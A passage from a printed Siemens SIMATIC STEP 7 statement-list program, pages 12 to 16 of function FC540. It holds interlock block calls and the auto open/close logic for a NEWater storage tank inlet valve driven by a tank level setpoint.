      U     M      0.0 @LOG_0                    
      =     L     16.4
      BLD   103
      U     M      0.0 @LOG_0                    
      =     L     16.5
      BLD   103
      U     M      0.0 @LOG_0                    
      =     L     16.6
      BLD   103
      U     M      0.1 @LOG_1                    
      =     L     16.7
      BLD   103
      U     M      0.1 @LOG_1                    
      =     L     17.0
      BLD   103
      U     M      0.1 @LOG_1                    
      =     L     17.1
      BLD   103
      U     M      0.1 @LOG_1                    
      =     L     17.2
      BLD   103
      U     M      0.1 @LOG_1                    

                                                                                  Page 12 of 16



SIMATIC                                   DMW\SIMATIC                    05/20/2025 02:28:04 PM
                        H Station\CPU 412-3 H(A)\...\FC540 - <offline>                         

      =     L     17.3
      BLD   103
      U     M      0.1 @LOG_1                    
      =     L     17.4
      BLD   103
      U     M      0.0 @LOG_0                    
      =     L     17.5
      BLD   103
      U     M      0.0 @LOG_0                    
      =     L     17.6
      BLD   103
      U     M      0.1 @LOG_1                    
      =     L     17.7
      BLD   103
      U     M      0.0 @LOG_0                    
      =     L     18.0
      BLD   103
      U     M      0.0 @LOG_0                    
      =     L     18.1
      BLD   103
      U     M      0.0 @LOG_0                    
      =     L     18.2
      BLD   103
      U     M      0.1 @LOG_1                    
      =     L     18.3
      BLD   103
      CALL  FC     7 INTERLOCK                 
       I_A1     :=L16.0
       I_A2     :=L16.1
       I_A3     :=L16.2
       I_B1     :=L16.3
       I_B2     :=L16.4
       I_B3     :=L16.5
       I_C3     :=L16.6
       NEG_A1   :=L16.7
       NEG_A2   :=L17.0
       NEG_A3   :=L17.1
       NEG_B1   :=L17.2
       NEG_B2   :=L17.3
       NEG_B3   :=L17.4
       NEG_C1   :=L17.5
       NEG_C2   :=L17.6
       NEG_C3   :=L17.7
       A_AND_OR :=L18.0
       B_AND_OR :=L18.1
       C_AND_OR :=L18.2
       BYPASS_EN:=L18.3
       RET_VAL  :=MW2
       Q        :=DB504.DBX0.5 "GAF13AP001".RUN_INT       -- Run Interlock
       DATA     :="ILOCK_DB".GAF13AP001_RI "ILOCK_DB".GAF13AP001_RI  
      NOP   0

Network: 29     

Network: 30       GAC10AA001 : NEWater Storage Tank Inlet MOV      

Linking, 0=Operator Active

      UN    DB201.DBX    2.1 "GRP001_CONTROL".GRP_MANUAL
      =     DB505.DBX    0.1 "GAC10AA001".LIOP_SEL      -- Select : 1=Linking, 0=Operator Active

Network: 31       GAC10AA001 : NEWater Storage Tank Inlet MOV       

Linkable Input for MANUAL/AUTO Mode

      U     DB201.DBX    2.0 "GRP001_CONTROL".GRP_AUTO 
      =     DB505.DBX    0.2 "GAC10AA001".AUT_L         -- Linkable Input for MANUAL/AUTO Mode

                                                                                  Page 13 of 16



SIMATIC                                   DMW\SIMATIC                    05/20/2025 02:28:04 PM
                        H Station\CPU 412-3 H(A)\...\FC540 - <offline>                         

Network: 32       GAC10AA001 : NEWater Storage Tank Inlet MOV     

AUTO Mode command; 1=ON, 0=OFF

      U     M      0.1 @LOG_1                    
      =     L     16.0

      U     L     16.0
      U(    
      L     DB501.DBD   54 "GAC10CL001".U             -- Analog Input (Scaled Value)
      L     DB100.DBD    8 "PROCESS_SP".SP_NEWTR_STRG_TNK_LT_M -- NEWATER STORAGE TANK LEVEL TRANSMITTER M  SE

TPOINT IN mm
      <=R   
      )     
      S     DB205.DBX    0.0 "GRP001_COMMANDS".GAC10AA101_AUTO_OC -- NEWATER TANK INLET VALVE AUTO OPEN CLOSE CO

MMAND
      U     L     16.0
      U     DB501.DBX   62.2 "GAC10CL001".QH_WRN        -- 1=H Alarm active (Warning)
      R     DB205.DBX    0.0 "GRP001_COMMANDS".GAC10AA101_AUTO_OC -- NEWATER TANK INLET VALVE AUTO OPEN CLOSE CO

MMAND

Network: 33       GAC10AA001 : NEWater Storage Tank Inlet MOV

AUTO Mode command; 1=OPEN, 0=CLOSE 

      U     DB205.DBX    0.0 "GRP001_COMMANDS".GAC10AA101_AUTO_OC -- NEWATER TANK INLET VALVE AUTO OPEN CLOSE CO
MMAND

      =     DB505.DBX    0.6 "GAC10AA001".AUTO_OC       -- AUTO Mode command; 1=OPEN, 0=CLOSE

Network: 34       GAC10AA001 : NEWater Storage Tank Inlet MOV     

Linkable Input RESET

      U     DB201.DBX    2.2 "GRP001_CONTROL".GRP_RESET
      =     DB505.DBX    0.3 "GAC10AA001".L_RESET       -- Linkable Input RESET

Network: 35       GAC10AA001 : NEWater Storage Tank Inlet MOV        

FOR START CONDITION - INTERLOCK BLOCK HAS CALL

      U     M      0.0 @LOG_0                    
      =     L     16.0
      BLD   103
      U     M      0.0 @LOG_0                    
      =     L     16.1
      BLD   103
      U     M      0.0 @LOG_0                    
      =     L     16.2
      BLD   103
      U     M      0.0 @LOG_0                    
      =     L     16.3
      BLD   103
      U     M      0.0 @LOG_0                    
      =     L     16.4
      BLD   103
      U     M      0.0 @LOG_0                    
      =     L     16.5
      BLD   103
      U     M      0.0 @LOG_0                    
      =     L     16.6
      BLD   103
      U     M      0.1 @LOG_1                    
      =     L     16.7
      BLD   103
      U     M      0.1 @LOG_1                    
      =     L     17.0
      BLD   103
      U     M      0.1 @LOG_1                    
      =     L     17.1
      BLD   103
      U     M      0.1 @LOG_1                    
      =     L     17.2
      BLD   103
      U     M      0.1 @LOG_1                    
      =     L     17.3
      BLD   103

                                                                                  Page 14 of 16



SIMATIC                                   DMW\SIMATIC                    05/20/2025 02:28:04 PM
                        H Station\CPU 412-3 H(A)\...\FC540 - <offline>                         

      U     M      0.1 @LOG_1                    
      =     L     17.4
      BLD   103
      U     M      0.0 @LOG_0                    
      =     L     17.5
      BLD   103
      U     M      0.0 @LOG_0                    
      =     L     17.6
      BLD   103
      U     M      0.1 @LOG_1                    
      =     L     17.7
      BLD   103
      U     M      0.0 @LOG_0                    
      =     L     18.0
      BLD   103
      U     M      0.0 @LOG_0                    
      =     L     18.1
      BLD   103
      U     M      0.0 @LOG_0                    
      =     L     18.2
      BLD   103
      U     M      0.1 @LOG_1                    
      =     L     18.3
      BLD   103
      CALL  FC     7 INTERLOCK                 
       I_A1     :=L16.0
       I_A2     :=L16.1
       I_A3     :=L16.2
       I_B1     :=L16.3
       I_B2     :=L16.4
       I_B3     :=L16.5
       I_C3     :=L16.6
       NEG_A1   :=L16.7
       NEG_A2   :=L17.0
       NEG_A3   :=L17.1
       NEG_B1   :=L17.2
       NEG_B2   :=L17.3
       NEG_B3   :=L17.4
       NEG_C1   :=L17.5
       NEG_C2   :=L17.6
       NEG_C3   :=L17.7
       A_AND_OR :=L18.0
       B_AND_OR :=L18.1
       C_AND_OR :=L18.2
       BYPASS_EN:=L18.3
       RET_VAL  :=MW2
       Q        :=DB505.DBX0.4 "GAC10AA001".START_INT     -- Start Interlock 0=Healthy
       DATA     :="ILOCK_DB".GAC10AA001_SI "ILOCK_DB".GAC10AA001_SI  
      NOP   0

Network: 36       GAC10AA001 : NEWater Storage Tank Inlet MOV     

FOR RUN CONDITION - INTERLOCK BLOCK HAS CALL

      U     M      0.0 @LOG_0                    
      =     L     16.0
      BLD   103
      U     M      0.0 @LOG_0                    
      =     L     16.1
      BLD   103
      U     M      0.0 @LOG_0                    
      =     L     16.2
      BLD   103
      U     M      0.0 @LOG_0                    
      =     L     16.3
      BLD   103
      U     M      0.0 @LOG_0                    
      =     L     16.4
      BLD   103
      U     M      0.0 @LOG_0                    
      =     L     16.5
      BLD   103
      U     M      0.0 @LOG_0                    
      =     L     16.6
      BLD   103
      U     M      0.1 @LOG_1                    
      =     L     16.7
      BLD   103
      U     M      0.1 @LOG_1                    
      =     L     17.0
      BLD   103
      U     M      0.1 @LOG_1                    

                                                                                  Page 15 of 16



SIMATIC                                   DMW\SIMATIC                    05/20/2025 02:28:05 PM
                        H Station\CPU 412-3 H(A)\...\FC540 - <offline>                         

      =     L     17.1
      BLD   103
      U     M      0.1 @LOG_1                    
      =     L     17.2
      BLD   103
      U     M      0.1 @LOG_1                    
      =     L     17.3
      BLD   103
      U     M      0.1 @LOG_1                    
      =     L     17.4
      BLD   103
      U     M      0.0 @LOG_0                    
      =     L     17.5
      BLD   103
      U     M      0.0 @LOG_0                    
      =     L     17.6
      BLD   103
      U     M      0.1 @LOG_1                    
      =     L     17.7
      BLD   103
      U     M      0.0 @LOG_0                    
      =     L     18.0
      BLD   103
      U     M      0.0 @LOG_0                    
      =     L     18.1
      BLD   103
      U     M      0.0 @LOG_0                    
      =     L     18.2
      BLD   103
      U     M      0.1 @LOG_1                    
      =     L     18.3
      BLD   103
      CALL  FC     7 INTERLOCK                 
       I_A1     :=L16.0
       I_A2     :=L16.1
       I_A3     :=L16.2
       I_B1     :=L16.3
       I_B2     :=L16.4
       I_B3     :=L16.5
       I_C3     :=L16.6
       NEG_A1   :=L16.7
       NEG_A2   :=L17.0
       NEG_A3   :=L17.1
       NEG_B1   :=L17.2
       NEG_B2   :=L17.3
       NEG_B3   :=L17.4
       NEG_C1   :=L17.5
       NEG_C2   :=L17.6
       NEG_C3   :=L17.7
       A_AND_OR :=L18.0
       B_AND_OR :=L18.1
       C_AND_OR :=L18.2
       BYPASS_EN:=L18.3
       RET_VAL  :=MW2
       Q        :=DB505.DBX0.5 "GAC10AA001".RUN_INT       -- Run Interlock 0=Healthy
       DATA     :="ILOCK_DB".GAC10AA001_RI "ILOCK_DB".GAC10AA001_RI  
      NOP   0

                                                                                  Page 16 of 16